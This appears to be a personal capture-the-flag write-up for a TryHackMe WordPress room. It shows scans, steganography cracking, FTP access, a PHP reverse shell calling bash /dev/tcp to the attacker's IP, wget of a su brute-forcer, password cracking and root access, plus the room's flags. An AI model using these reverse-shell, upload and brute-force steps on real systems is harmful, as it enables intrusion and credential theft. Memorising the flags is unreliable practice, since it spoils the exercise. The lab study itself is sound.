----
interesting room, you can shoot the sun
----

![](https://i.imgur.com/KoKRoAE.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/d4f7722b23452cbec5416193f4b55aa6.jpeg)

### Task 1  Basic scan

 Start Machine

  
`MACHINE_IP`

﻿Hello there

We will tend to think differently in this room.

In fact, we will understand that what we see is not what we think, and if you go beyond the purpose, you will disappear in the room, fall into a rabbit hole.﻿

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.27.15 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.27.15:21
Open 10.10.27.15:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 19:05 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:05
Completed Parallel DNS resolution of 1 host. at 19:05, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:05
Scanning 10.10.27.15 [2 ports]
Discovered open port 21/tcp on 10.10.27.15
Discovered open port 80/tcp on 10.10.27.15
Completed Connect Scan at 19:05, 0.18s elapsed (2 total ports)
Initiating Service scan at 19:05
Scanning 2 services on 10.10.27.15
Completed Service scan at 19:06, 16.88s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.27.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 20.78s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 1.55s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
Nmap scan report for 10.10.27.15
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-19 19:05:46 EDT for 39s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: Hello World &#8211; Just another WordPress site
|_http-generator: WordPress 5.6
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.1.1; OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:06
Completed NSE at 19:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.53 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.27.15 -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/10.10.27.15/_23-07-19_19-10-10.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-07-19_19-10-10.log

Target: http://10.10.27.15/

[19:10:11] Starting: 
[19:10:16] 301 -  318B  - /announcements  ->  http://10.10.27.15/announcements/
[19:10:30] 301 -    0B  - /index.php  ->  http://10.10.27.15/
[19:10:31] 301 -  315B  - /javascript  ->  http://10.10.27.15/javascript/
[19:10:40] 301 -  315B  - /phpmyadmin  ->  http://10.10.27.15/phpmyadmin/
[19:10:57] 301 -  313B  - /wp-admin  ->  http://10.10.27.15/wp-admin/
[19:10:57] 301 -  316B  - /wp-includes  ->  http://10.10.27.15/wp-includes/
[19:10:57] 301 -  315B  - /wp-content  ->  http://10.10.27.15/wp-content/


```

How many ports are open ?

*2*

What is the name of the secret directory ?

*/announcements*

### Task 2  Localhost

This place will be solved from inside after receiving a shell  

Answer the questions below

```
download the 2 files
┌──(witty㉿kali)-[~]
└─$ stegseek austrailian-bulldog-ant.jpg /home/witty/Downloads/wordlist.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".

┌──(witty㉿kali)-[~]
└─$ cat austrailian-bulldog-ant.jpg.out 
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
                                                                                    
┌──(witty㉿kali)-[~]
└─$ echo "RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=" | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack 

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.27.15  
Connected to 10.10.27.15.
220 (vsFTPd 3.0.3)
Name (10.10.27.15:witty): hakanftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||45100|)
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.

ftp> put revshell.php
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||54405|)
150 Ok to send data.
100% |*************************************************|    74        1.03 MiB/s    00:00 ETA
226 Transfer complete.
74 bytes sent in 00:00 (0.19 KiB/s)

┌──(witty㉿kali)-[~]
└─$ cat revshell.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'");?>

http://10.10.27.15/revshell.php

not found maybe aanother subdomain


ftp> more wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

http://10.10.27.15/phpmyadmin login

phpmyadmin1 -> wp_options -> site_url was a subdomain

http://subdomain.adana.thm

┌──(witty㉿kali)-[~]
└─$ tac /etc/hosts
10.10.27.15 subdomain.adana.thm

now give permission to revshell.php

ftp> chmod 777 revshell.php
200 SITE CHMOD command ok.

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.27.15] 45874
bash: cannot set terminal process group (936): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/subdomain$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@ubuntu:/var/www/subdomain$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/subdomain$ ls
ls
announcements	 wp-admin	       wp-includes	  wp-signup.php
index.php	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
license.txt	 wp-comments-post.php  wp-load.php	  xmlrpc.php
readme.html	 wp-config.php	       wp-login.php
revshell.php	 wp-content	       wp-mail.php
wp-activate.php  wp-cron.php	       wp-settings.php
www-data@ubuntu:/var/www/subdomain$ cd ..
cd ..
www-data@ubuntu:/var/www$ ls
ls
html  subdomain
www-data@ubuntu:/var/www$ cd html
cd html
www-data@ubuntu:/var/www/html$ ls
ls
announcements	 wp-blog-header.php    wp-links-opml.php  wp-trackback.php
index.php	 wp-comments-post.php  wp-load.php	  wwe3bbfla4g.txt
license.txt	 wp-config.php	       wp-login.php	  xmlrpc.php
readme.html	 wp-content	       wp-mail.php
wp-activate.php  wp-cron.php	       wp-settings.php
wp-admin	 wp-includes	       wp-signup.php
www-data@ubuntu:/var/www/html$ cat wwe3bbfla4g.txt
cat wwe3bbfla4g.txt
THM{343a7e2064a1d992c01ee201c346edff}

www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
hakanbey
www-data@ubuntu:/home$ cd hakanbey
cd hakanbey
bash: cd: hakanbey: Permission denied

www-data@ubuntu:/home$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null

123adana

┌──(witty㉿kali)-[~/Downloads]
└─$ sed 's/^/123adana/' wordlist.txt > 123_wordlist.txt
                                                         
┌──(witty㉿kali)-[~/Downloads]
└─$ more 123_wordlist.txt            
123adana123456
123adana12345


the command takes the content of "wordlist.txt", adds "123adana" at the beginning of each line, and saves the modified content in a new file named "123_wordlist.txt"

http://archive.ubuntu.com/ubuntu/pool/universe/s/sucrack/sucrack_1.2.3-5_amd64.deb

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.27.15 - - [19/Jul/2023 20:08:51] "GET /sucrack_1.2.3-5_amd64.deb HTTP/1.1" 200 -

www-data@ubuntu:/home$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget http://10.8.19.103/sucrack_1.2.3-5_amd64.deb
wget http://10.8.19.103/sucrack_1.2.3-5_amd64.deb
--2023-07-20 00:08:51--  http://10.8.19.103/sucrack_1.2.3-5_amd64.deb
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17860 (17K) [application/vnd.debian.binary-package]
Saving to: 'sucrack_1.2.3-5_amd64.deb'

sucrack_1.2.3-5_amd 100%[===================>]  17.44K  90.8KB/s    in 0.2s    

2023-07-20 00:08:52 (90.8 KB/s) - 'sucrack_1.2.3-5_amd64.deb' saved [17860/17860]

www-data@ubuntu:/tmp$ dpkg -x sucrack_1.2.3-5_amd64.deb sucrack
dpkg -x sucrack_1.2.3-5_amd64.deb sucrack
www-data@ubuntu:/tmp$ ls
ls
sucrack  sucrack_1.2.3-5_amd64.deb

www-data@ubuntu:/tmp$ wget http://10.8.19.103/123_wordlist.txt
wget http://10.8.19.103/123_wordlist.txt
--2023-07-20 00:10:13--  http://10.8.19.103/123_wordlist.txt
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 803930 (785K) [text/plain]
Saving to: '123_wordlist.txt'

123_wordlist.txt    100%[===================>] 785.09K   299KB/s    in 2.6s    

2023-07-20 00:10:16 (299 KB/s) - '123_wordlist.txt' saved [803930/803930]

www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -h
./sucrack -h
sucrack 1.2.3 (LINUX) - the su cracker
Copyright (C) 2006  Nico Leidecker; nfl@portcullis-security.com

 Usage: ./sucrack [-char] [-w num] [-b size] [-s sec] [-u user] [-l rules] wordlist

 The word list can either be an existing file or stdin. In that case, use '-' instead of a file name

 Options:
   h       : print this message
   a       : use ansi escape codes for nice looking statistics
   s sec   : statistics display interval
   c       : only print statistics if a key other than `q' is pressed
   r       : enable rewriter
   w num   : number of worker threads running with
   b size  : size of word list buffer
   u user  : user account to su to
   l rules : specify rewriting rules; rules can be:
               A = all characters upper case
               F = first character upper case
               L = last character upper case
               a = all characters lower case
               f = first character lower case
               l = last character lower case
               D = prepend digit
               d = append digit
               e = 1337 characters
               x = all rules

 Environment Variables:
   SUCRACK_SU_PATH      : The path to su (usually /bin/su or /usr/bin/su)

   SUCRACK_AUTH_FAILURE : The message su returns on an authentication
                          failure (like "su: Authentication failure" or "su: Sorry")
   SUCRACK_AUTH_SUCCESS : The message that indicates an authentication
                          success. This message must not be a password
                          listed in the wordlist (default is "SUCRACK_SUCCESS")

 Example:
   export SUCRACK_AUTH_SUCCESS="sucrack_says_hello"
   ./sucrack -a -w 20 -s 10 -u root -rl AFLafld dict.txt

www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 100 -b 500 -u hakanbey /tmp/123_wordlist.txt
<ack -w 100 -b 500 -u hakanbey /tmp/123_wordlist.txt
password is: 123adanasubaru

www-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey
Password: 123adanasubaru

hakanbey@ubuntu:/tmp/sucrack/usr/bin$ cd /home/hakanbey
hakanbey@ubuntu:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt   website
hakanbey@ubuntu:~$ cat user.txt
THM{8ba9d7715fe726332b7fc9bd00e67127}

hakanbey@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null
/bin/fusermount
/bin/su
/bin/umount
/bin/mount
/bin/ping
/usr/local/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/arping
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/binary
/usr/bin/at
/usr/bin/newgrp
/usr/sbin/pppd
/usr/sbin/exim4

hakanbey@ubuntu:~$ ltrace /usr/bin/binary
strcat("war", "zone")                            = "warzone"
strcat("warzone", "in")                          = "warzonein"
strcat("warzonein", "ada")                       = "warzoneinada"
strcat("warzoneinada", "na")                     = "warzoneinadana"
printf("I think you should enter the cor"...)    = 52
__isoc99_scanf(0x562d567b3edd, 0x7fff9ed60a60, 0, 0I think you should enter the correct string here ==>
warzoneinadana
) = 1
strcmp("warzoneinadana", "warzoneinadana")       = 0
fopen("/root/hint.txt", "r")                     = 0
__isoc99_fscanf(0, 0x562d567b3edd, 0x7fff9ed60a80, 1 <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

hakanbey@ubuntu:~$ /usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg

hakanbey@ubuntu:~$ xxd root.jpg
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM
00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275  ...=y._..m..i..u

https://cyberchef.io/#recipe=From_Hex('Auto')To_Base85('!-u',false)&input=ZmVlOTlkM2Q3OTE4NWZmYzgyNmRkZjFjNjlhY2MyNzU

using hint

fee99d3d79185ffc826ddf1c69acc275

root:Go0odJo0BbBro0o

hakanbey@ubuntu:~$ su root
Password: Go0odJo0BbBro0o

root@ubuntu:/home/hakanbey# cd /root
root@ubuntu:~# ls
hint.txt  root.jpg  root.txt
root@ubuntu:~# cat root.txt
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
root@ubuntu:~# cat hint.txt
Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)


```


![[Pasted image 20230719182422.png]]

Web flag ?

*THM{343a7e2064a1d992c01ee201c346edff}*

User flag ?

*THM{8ba9d7715fe726332b7fc9bd00e67127}*

Root flag ?

From HEX, To Base85

*THM{c5a9d3e4147a13cbd1ca24b014466a6c}*

[[Uranium CTF]]